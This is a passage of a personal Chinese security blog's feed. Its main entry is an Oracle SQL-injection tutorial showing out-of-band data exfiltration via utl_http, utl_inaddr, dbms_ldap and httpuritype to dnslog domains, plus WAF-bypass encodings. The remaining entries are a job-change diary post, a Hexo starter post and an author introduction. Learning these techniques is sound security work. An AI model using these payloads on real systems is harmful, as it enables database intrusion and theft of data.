语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度</p><p>两种思路：</p><p>第一种：使用Oracle发送HTTP请求，相关函数：utl_http.request()，需要自己搭建外网web服务器，并记录请求的日志信息，然后使用utl_http.request()向外网主机发送http请求，请求便携带了查询的结果信息。此处可以结合SSRF进行内网探测 ，或许这就是Oracle的ssrf。</p><p>第二种（DNSlog）：使用Oracle发送DNS请求，相关函数：utl_inaddr.get_host_address()、utl_inaddr.get_host_name()，将查询结果拼接到域名下，并使用DNS记录解析日志。</p><p>理解：这两种方式应该对Oracle的版本有要求，应该与utl_inaddr.get_host_name()函数要求一致，11g之后需要网络访问权限。</p><p><strong>utl_http.request()</strong> :步骤：首先检测函数是否能用，其中函数返回值是请求的返回值。</p><p> <code>http://127.0.0.1/oracle.php?id=1&#39; and exists (select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;) --</code>，页面返回正常说明该函数可以使用。<br> <img src="/2021/06/23/oracle/image-20210429151948723.jpg" alt="image-20210429151948723"></p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and utl_http.request(<span class="string">&#x27;http://域名或者ip:端口/&#x27;</span>||(注入的sql语句))=1 --</span><br></pre></td></tr></table></figure><p>其中||放在URL中的时候需要URL编码。切记！！！</p><p>准备监听的主机和端口：<br><img src="/2021/06/23/oracle/image-20210429152506120.jpg" alt="image-20210429152506120"></p><p>发送请求（获取当前用户名）：</p><p>我这里测试没有成功，报错ORA-00904: : invalid identifier，可能是版本问题。<br><img src="/2021/06/23/oracle/image-20210429154136271.jpg" alt="image-20210429154136271"></p><p><strong>utl_inaddr.get_host_address</strong></p><p>用法： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and utl_inaddr.get_host_address((sql语句)||<span class="string">&#x27;.dnslog的域名&#x27;</span>)=1 -- 这个页面会报错</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者and (select utl_inaddr.get_host_address((sql语句)||<span class="string">&#x27;.dnslog的域名&#x27;</span>) from dual)is not null-- 这个页面不会报错</span><br></pre></td></tr></table></figure><p>查询用户：<code>http://127.0.0.1/oracle.php?id=1&#39; and utl_inaddr.get_host_address((select user from dual)||&#39;.x72v9n.dnslog.cn&#39;)=1 -- </code>页面会报错，但是dnslog成功接收到请求：<br><img src="/2021/06/23/oracle/image-20210429155048508.jpg" alt="image-20210429155048508"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39;and (select utl_inaddr.get_host_address((select user from dual)||&#39;.mqzr75.dnslog.cn&#39;) from dual)is not null-- </code>这个页面不会报错，dnslog成功接收请求<br><img src="/2021/06/23/oracle/image-20210429155522855.jpg" alt="image-20210429155522855"></p><p><img src="/2021/06/23/oracle/image-20210429155558404.jpg" alt="image-20210429155558404"></p><p><strong>sys.dbms_ldap.init()函数</strong></p><p>DBMS_LDAP软件包使您可以从LDAP服务器访问数据。</p><p>FUNCTIONN INIT():    init()用LDAP服务器初始化会话。这实际上建立了与LDAP服务器的连接。<br>语法:FUNCTION init(hostname IN VARCHAR2,portnum  IN PLS_INTEGER)RETURN SESSION;</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_ldap.init((sql语句)||<span class="string">&#x27;.dnslog的域名&#x27;</span>,80) from dual)is not null--</span><br></pre></td></tr></table></figure><p>查询用户：<code>http://127.0.0.1/oracle.php?id=1&#39;and (select dbms_ldap.init((select user from dual)%7c%7c&#39;.b6kogu.dnslog.cn&#39;,80) from dual)is not null-- </code>页面会报错，dnslog成功接收请求：<br><img src="/2021/06/23/oracle/image-20210429160619029.jpg" alt="image-20210429160619029"></p><p><img src="/2021/06/23/oracle/image-20210429160634533.jpg" alt="image-20210429160634533"></p><p><strong>httpuritype()函数:</strong></p><p>可以创建UriType列，并在其中存储DBURITYPE，XDBURITYPE或HTTPURITYPE的实例。您还可以定义自己的UriType子类型来处理不同的URL协议。</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select httpuritype((sql语句)||<span class="string">&#x27;.dnslog的域名&#x27;</span>).getclob() from dual)is not null--</span><br></pre></td></tr></table></figure><p>查询当前用户：<code>http://127.0.0.1/oracle.php?id=1&#39;and (select httpuritype((select user from dual)%7c%7c&#39;.ayh5v3.dnslog.cn&#39;).getclob() from dual)is not null-- </code>页面会报错，dnslog成功接收请求<br><img src="/2021/06/23/oracle/image-20210429161153732.jpg" alt="image-20210429161153732"></p><p><img src="/2021/06/23/oracle/image-20210429161206874.jpg" alt="image-20210429161206874"></p><h2 id="Oracle绕过技巧"><a href="#Oracle绕过技巧" class="headerlink" title="Oracle绕过技巧"></a>Oracle绕过技巧</h2><p>使用hextoraw()及asciistr()搭配UTL_RAW.CAST_TO_VARCHAR2()函数来进行ascii的编码</p><p>hextoraw()：十六进制字符串转换为raw<br>SELECT UTL_RAW.CAST_TO_VARCHAR2(hextoraw(“abcdef”)) FROM dual<br>使用rawtohex()来进行ascii的解码</p><p>SELECT rawtohex(‘abcdef’) FROM dual<br>下面是一些利用编码绕过的情况</p><p>SELECT 1 FROM dual;             正常语句<br>SELECT%0a1%0aFROM%0adual;       \n换行来替代空格<br>SELECT%0b1%0bFROM%0bdual;        使用tab来替换空格<br>SELECT%0c1%0cFROM%0cdual;        使用\r回车开替换空格<br>SELECT/<strong>/1/</strong>/FROM/<em><em>/dual;     多行注释符来替代回车<br>SELECT–%0a1–%0aFROM–%0adual;  单行注释符和换行来替代回车<br>SELECT/</em>!12321SELECT*/1/*!12321AND</em>/FROM/<em>!12321QWE</em>/dual; 使用内联注释符</p><p>借用了在MySQL中bypass常用的技巧来做了简单的可行性测试，注释符和换行的搭配使用。</p><ol><li>注释符拼接垃圾字符配合换行SQL&gt; select – asdnaso/<em>asdas</em>/  2  user from–ioasndoiand  3  dual;USER<br>SQLI:</li><li>利用waf的通用性特点SQL&gt; select user/<em>!saho</em>/from dual;USER/<em>!SAHO</em>/<br>SQLISQL&gt; 调用函数是可使用空格换行等select ctxsys. drithsx.sn(user,’aa’)from dual;</li></ol><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><strong>未完待续</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库&lt;/p&gt;
&lt;p&gt;数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。&lt;br&gt;数据库名和实例名可以相同也可以不同。&lt;br&gt;在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。&lt;/p&gt;</summary>
    
    
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="技术" scheme="http://example.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>日记-20210623</title>
    <link href="http://example.com/2021/06/23/20210623%E6%97%A5%E8%AE%B0/"/>
    <id>http://example.com/2021/06/23/20210623%E6%97%A5%E8%AE%B0/</id>
    <published>2021-06-22T16:00:00.000Z</published>
    <updated>2021-06-23T14:11:57.545Z</updated>
    
    <content type="html"><![CDATA[<p>今天是2021年06月23日星期三。</p><h2 id="20210623"><a href="#20210623" class="headerlink" title="20210623"></a>20210623</h2><p>广州这边又下大雨了，我已经离职了，但是我在等新公司的入职通知。</p><p>这几天我做了很多决定，我决定了自己的工作方向，我希望以后我不会为我今天所做的决定而后悔。我想要进步，我要不断的学习新的知识和新的技术，所以我原本想找一个学习技术的方向的岗位的，但是入职后发现是偏向于培训的，所以我就又离职了。现在打算去一个新的岗位，然而这个新的岗位的工作内容是跟我上一个岗位是几乎一样的，虽然我不太情愿再做这个方向，但是没有办法，为了生活只能先做着先，毕竟自己太菜了找工作不容易啊。<span id="more"></span></p><p>当然了，做这个决定我也是无奈，我只能希望通过我自己今后的最大努力去让自己以后不会后悔现在自己所做的这个决定。   </p><p>说点其他的，我这个人性格有点懒散，不太会主动去学习，都是遇到困难了或者有需求了才会去学习，我真的好像改掉这个不好的性格，我想要学习，我想要进步，希望自己能越来越好吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天是2021年06月23日星期三。&lt;/p&gt;
&lt;h2 id=&quot;20210623&quot;&gt;&lt;a href=&quot;#20210623&quot; class=&quot;headerlink&quot; title=&quot;20210623&quot;&gt;&lt;/a&gt;20210623&lt;/h2&gt;&lt;p&gt;广州这边又下大雨了，我已经离职了，但是我在等新公司的入职通知。&lt;/p&gt;
&lt;p&gt;这几天我做了很多决定，我决定了自己的工作方向，我希望以后我不会为我今天所做的决定而后悔。我想要进步，我要不断的学习新的知识和新的技术，所以我原本想找一个学习技术的方向的岗位的，但是入职后发现是偏向于培训的，所以我就又离职了。现在打算去一个新的岗位，然而这个新的岗位的工作内容是跟我上一个岗位是几乎一样的，虽然我不太情愿再做这个方向，但是没有办法，为了生活只能先做着先，毕竟自己太菜了找工作不容易啊。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日记" scheme="http://example.com/tags/%E6%97%A5%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/06/22/hello-world/"/>
    <id>http://example.com/2021/06/22/hello-world/</id>
    <published>2021-06-22T12:23:26.956Z</published>
    <updated>2021-06-23T14:12:00.594Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初次见面</title>
    <link href="http://example.com/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/"/>
    <id>http://example.com/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/</id>
    <published>2021-06-21T16:00:00.000Z</published>
    <updated>2021-06-23T14:06:42.230Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。<span id="more"></span></p><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>本人是一名白帽子，目前再某安全公司上班。当然啦，我不是什么大神，我也只是一个半路出家的小白。平时喜欢web渗透，但是还有很多地方需要提高，请各位多多指教。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
